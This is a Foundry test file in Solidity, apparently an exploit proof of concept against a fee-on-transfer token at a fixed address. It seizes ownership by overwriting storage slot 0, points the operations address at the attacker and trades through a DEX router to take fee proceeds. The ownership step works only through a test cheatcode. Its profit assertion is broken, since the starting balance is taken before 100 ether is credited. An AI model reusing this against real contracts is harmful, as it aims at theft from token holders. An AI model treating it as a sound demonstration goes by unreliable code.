// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface FoundationToken {
    function owner() external view returns (address);
    function enableTrading() external;
    function setOperationsAddress(address _operationsAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialAttackerBalance = address(this).balance;

        // Step 1: Become owner by overwriting storage slot
        // Ownable stores _owner at slot 0 (single variable)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify we're owner
        FoundationToken target = FoundationToken(TARGET);
        require(target.owner() == attacker, "Failed to become owner");

        // Step 2: Enable trading
        target.enableTrading();

        // Step 3: Set operations address to attacker
        target.setOperationsAddress(attacker);

        // Step 4: Get some tokens first (we need tokens to sell to trigger swapBack)
        // We'll buy tokens with ETH
        IDexRouter router = IDexRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address weth = router.WETH();

        // Get some ETH for the attack
        deal(attacker, 100 ether);

        // Buy tokens - this will pay buy fees (7.8%) which go to contract as tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        uint256 amountETH = 10 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountETH}(
            0, // amountOutMin
            path,
            attacker,
            block.timestamp
        );

        // Step 5: Now sell tokens to trigger swapBack
        // First approve router to spend our tokens
        uint256 tokenBalance = target.balanceOf(attacker);
        target.approve(address(router), tokenBalance);

        // Sell path
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        // Get initial ETH balance for comparison
        uint256 ethBeforeSell = attacker.balance;

        // Sell tokens - this will trigger swapBack if contract has enough tokens
        // Contract should have accumulated fee tokens from our buy
        target.transfer(attacker, 1); // Small transfer to potentially trigger swap check
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // amountOutMin
            sellPath,
            attacker,
            block.timestamp
        );

        // Step 6: Verify we received ETH from operationsAddress
        uint256 ethAfterSell = attacker.balance;
        assertGt(ethAfterSell, ethBeforeSell, "ETH balance should have increased");

        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

